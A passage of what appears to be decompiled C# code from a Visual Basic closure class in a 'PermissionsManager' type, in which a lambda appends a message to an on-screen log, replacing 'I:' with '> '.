      ((PermissionsManager) this).\u0024VB\u0024Local_msg = ((PermissionsManager) arg0).\u0024VB\u0024Local_msg;
    }

    [SpecialName]
    internal void _Lambda\u0024__1()
    {
      ((PermissionsManager) this).\u0024VB\u0024Me.log.AppendText(Environment.NewLine + ((PermissionsManager) this).\u0024VB\u0024Local_msg.Replace("I:", "> "));
    }
  }
}
